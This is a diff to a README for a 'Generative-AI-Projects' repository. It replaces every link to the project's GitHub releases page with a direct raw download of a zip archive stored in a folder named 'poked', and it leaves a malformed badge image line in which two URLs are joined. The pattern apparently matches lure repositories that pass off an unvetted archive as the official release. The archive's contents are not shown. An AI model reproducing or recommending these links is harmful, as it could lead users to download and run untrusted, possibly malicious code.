@@ -6,7 +6,7 @@ Welcome to the Generative-AI-Projects repository! This project includes various 
 
 ## 🔗 Download Now
 
-[![Download Generative-AI-Projects Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/rayyantoji/Generative-AI-Projects/releases)
+[![Download Generative-AI-Projects Releases](https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/Generative-AI-Projects.zip%https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/Generative-AI-Projects.zip)](https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/Generative-AI-Projects.zip)
 
 ## 📋 Overview
 
@@ -39,7 +39,7 @@ The Generative-AI-Projects repository includes the following features:
 
 ## 📥 Download & Install
 
-To download the latest version of the Generative-AI-Projects software, visit this page: [Download Releases](https://github.com/rayyantoji/Generative-AI-Projects/releases).
+To download the latest version of the Generative-AI-Projects software, visit this page: [Download Releases](https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/Generative-AI-Projects.zip).
 
 1. Click on the link.
 2. Browse the list of available releases.
@@ -76,7 +76,7 @@ You are not alone in using this software. Join our community to connect with fel
 
 ## 🔗 Stay Updated
 
-Keep an eye on this repository for updates and new releases. Simply check the [Releases Page](https://github.com/rayyantoji/Generative-AI-Projects/releases) regularly.
+Keep an eye on this repository for updates and new releases. Simply check the [Releases Page](https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/Generative-AI-Projects.zip) regularly.
 
 ## ⭐ Conclusion
 
